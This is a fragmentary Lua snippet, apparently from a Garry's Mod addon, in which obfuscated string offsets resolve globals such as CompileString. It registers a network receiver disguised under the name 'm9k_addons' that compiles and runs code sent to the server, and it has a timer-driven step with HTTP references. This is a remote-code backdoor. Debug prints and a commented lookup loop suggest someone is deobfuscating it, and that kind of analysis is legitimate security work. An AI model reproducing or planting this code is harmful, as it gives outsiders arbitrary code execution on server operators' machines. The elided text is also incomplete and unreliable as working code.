...
local mt = {0, 6, 10, 21, 34, 38, 54, 57, 66, 69, 75, 80, 86, 90, 94, 115, 130, 138, 140, 146, 152, 162, 172, 176, 182}

local l = function(n)
	local SubTab = ms:sub( mt[n] + 1, mt[n + 1] )
	print("! SubTab: ", SubTab, n)
	return SubTab
end
local g = function(n)
	local Lookup = l(n)
	print("! Lookup: ", Lookup, n)
	return _G[ Lookup ]
end

--[[
for i=0, 255 do
	local Out,v = pcall(g, i)
	if Out then
		print(i, Out,v)
	end
end
...
if g(1) and g(2)[ l(3) ]() then
	local f = function() end
	local c = g(4) --CompileString
	local r = g(7)[l(22)]
	
	g(5)[ l(6) ]( l(21) )
	
	--net.Receivers["m9k_addons"]
	g(7)[ l(8) ][ l(21) ] = (function()
		local s = c(r() or "--", l(9), false)
	...
	print("! http? ", l(12), l(15) )
	
	//timer.Simple(16,
	g(11)[ l(12) ](16, function()
		local lol = #g(19)[ l(20) ]()
